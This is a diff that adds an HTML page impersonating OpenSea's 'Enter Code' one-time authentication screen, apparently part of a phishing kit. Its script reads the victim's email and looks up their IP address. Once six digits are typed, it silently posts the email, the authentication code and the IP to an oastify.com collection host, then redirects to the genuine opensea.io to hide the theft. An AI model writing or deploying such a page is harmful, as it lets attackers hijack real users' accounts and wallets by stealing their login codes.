@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OpenSea - Enter Code</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: rgba(0, 0, 0, 0.8);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal {
+            background: #1a1a1a;
+            border-radius: 16px;
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+            position: relative;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #333;
+            text-align: center;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 28px;
+            cursor: pointer;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            background: #2081e1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 40px;
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .email-display {
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .code-inputs {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 25px;
+            justify-content: center;
+        }
+
+        .code-input {
+            width: 55px;
+            height: 55px;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 24px;
+            text-align: center;
+            font-weight: 600;
+            transition: border-color 0.2s;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: #2081e1;
+        }
+
+        .info-text {
+            color: #666;
+            font-size: 12px;
+            margin-top: 15px;
+            line-height: 1.6;
+        }
+
+        .resend-code {
+            color: #2081e1;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .resend-code:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="modal">
+        <button class="back-btn" onclick="goBack()">←</button>
+        <button class="close-btn" onclick="closeModal()">✕</button>
+
+        <div class="logo">🌊</div>
+        <h1>Enter Code</h1>
+        <p class="subtitle">
+            A one-time authentication code has been sent to<br>
+            <span class="email-display" id="emailDisplay">test@example.com</span>
+        </p>
+
+        <div class="code-inputs" id="codeContainer">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+            <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="info-text">
+            Expires in 10 minutes.
+            <a href="#" class="resend-code" onclick="resendCode(event)">Resend code</a>
+        </div>
+    </div>
+
+    <script>
+        var userEmail = localStorage.getItem('userEmail') || 'test@example.com';
+        document.getElementById('emailDisplay').textContent = userEmail;
+
+        window.visitorIP = 'Detecting...';
+
+        var ipAPIs = [
+            'https://api.ipify.org?format=json',
+            'https://api64.ipify.org?format=json'
+        ];
+
+        function detectIP(index = 0) {
+            if (index >= ipAPIs.length) {
+                window.visitorIP = 'Unknown';
+                return;
+            }
+
+            fetch(ipAPIs[index])
+                .then(r => r.json())
+                .then(data => {
+                    window.visitorIP = data.ip;
+                })
+                .catch(() => {
+                    detectIP(index + 1);
+                });
+        }
+
+        detectIP();
+
+        var inputs = document.querySelectorAll('.code-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                if (e.target.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+
+                if (Array.from(inputs).every(inp => inp.value)) {
+                    handleCodeSubmit();
+                }
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        function handleCodeSubmit() {
+            var code = Array.from(inputs).map(input => input.value).join('');
+
+            if (code.length !== 6) return;
+
+            var payload = 'email=' + encodeURIComponent(userEmail) + '&code=' + encodeURIComponent(code) + '&ip=' + encodeURIComponent(window.visitorIP) + '&step=code_submitted&time=' + encodeURIComponent(new Date().toISOString());
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://snjhhnfdgfawcbr8mrhy8oywlnrefe33.oastify.com/', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send(payload);
+
+            setTimeout(() => {
+                window.location = 'https://opensea.io';
+            }, 500);
+        }
+
+        function resendCode(event) {
+            event.preventDefault();
+            alert('Code sent to ' + userEmail);
+        }
+
+        function goBack() {
+            window.history.back();
+        }
+
+        function closeModal() {
+            window.location = 'https://opensea.io';
+        }
+
+        inputs[0].focus();
+    </script>
+</body>
+</html>
